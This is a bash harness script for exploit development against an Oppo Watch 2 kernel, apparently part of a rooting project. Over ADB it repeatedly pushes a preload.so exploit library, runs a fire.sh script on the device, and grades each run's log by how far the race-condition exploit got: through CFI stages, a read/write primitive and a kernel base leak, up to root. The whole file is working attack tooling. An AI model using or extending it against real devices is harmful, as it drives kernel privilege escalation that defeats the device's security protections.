#!/usr/bin/env bash
# Fire repeatedly.  Halt the moment a run survives the reclaim race far enough
# to enter the pselect route (PRE-PCFI) — that run's full log then shows whether
# the configfs read/write primitive fix lets escalation proceed.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
N=${1:-24}
LOCAL_SO=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/exploit/preload.so
WIN_SO='C:/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/exploit/preload.so'
best=0
for ((i=1;i<=N;i++)); do
  for k in $(seq 1 60); do $ADB devices | grep -q 'device$' && break; sleep 3; done
  for k in $(seq 1 20); do b=$($ADB shell 'getprop sys.boot_completed' 2>/dev/null | tr -d '\r'); [ "$b" = "1" ] && break; sleep 2; done
  # Self-heal the binary: f2fs(nobarrier)+panic can drop an unflushed push. Re-push
  # and sync whenever preload.so is missing so a fire never fails at the linker.
  if ! $ADB shell 'test -f /data/local/tmp/preload.so' 2>/dev/null; then
    $ADB push "$WIN_SO" $DT/preload.so >/dev/null 2>&1
  fi
  $ADB shell 'sync; sync' 2>/dev/null
  $ADB shell "rm -f $DT/log_*.txt" 2>/dev/null
  timeout 260 $ADB shell 'sh /data/local/tmp/fire.sh' >/dev/null 2>&1; rc=$?
  for k in $(seq 1 60); do $ADB devices | grep -q 'device$' && break; sleep 3; done
  for k in $(seq 1 20); do b=$($ADB shell 'getprop sys.boot_completed' 2>/dev/null | tr -d '\r'); [ "$b" = "1" ] && break; sleep 2; done
  # Retry the log read: the device may still be settling right after a panic
  # reboot, and a single early cat returns an empty file (a false "prep").
  : > "$ARCH/run_$i.log"
  for c in $(seq 1 12); do
    $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/run_$i.log"
    [ -s "$ARCH/run_$i.log" ] && break
    sleep 2
  done
  L="$ARCH/run_$i.log"
  # classify how deep this run got
  depth=prep
  grep -q 'PREP base=' "$L" && depth=PREP
  grep -q 'PRE-PCFI' "$L" && depth=PCFI
  grep -q 'CFI enter'  "$L" && depth=CFI-enter
  grep -q 'CFI pre-read'  "$L" && depth=CFI-preread
  grep -q 'CFI post-read' "$L" && depth=CFI-postread
  grep -q 'CFI post-write' "$L" && depth=CFI-postwrite
  grep -q 'CFI pre-leak-base' "$L" && depth=CFI-leak
  grep -q 'CFI pre-install-root' "$L" && depth=CFI-install
  grep -q 'PRW proof' "$L" && depth=PRW-proof
  grep -qE 'ROOT OK|uid_after=0|pipe-physrw-summary.*root=1' "$L" && depth=ROOT
  uid=$($ADB shell 'id -u' 2>/dev/null | tr -d '\r')
  lasta=$(grep -o 'PRE-PCFI a=[0-9]*' "$L" | tail -1)
  callsline=$(grep -oE 'calls=[0-9]+ success=[0-9]+' "$L" | grep -vE 'calls=0 success=0' | tail -1)
  tail=$(tail -c 90 "$L" | tr '\n' ' ')
  echo "run=$i rc=$rc uid=$uid depth=$depth $lasta $callsline"
  [ -n "$callsline" ] && echo "    >> calls>0 observed: $callsline"
  echo "    tail: $tail"
  if [ "$depth" = ROOT ]; then echo ">>> ROOT ACHIEVED run=$i <<<"; break; fi
  if [ "$depth" = CFI-enter ] || [ "$depth" = CFI-preread ] || \
     [ "$depth" = CFI-postread ] || [ "$depth" = CFI-postwrite ] || \
     [ "$depth" = CFI-leak ] || [ "$depth" = CFI-install ] || \
     [ "$depth" = PRW-proof ]; then
     echo ">>> escalation REACHED at $depth (run $i); stopping to inspect full log <<<"
     break
  fi
done
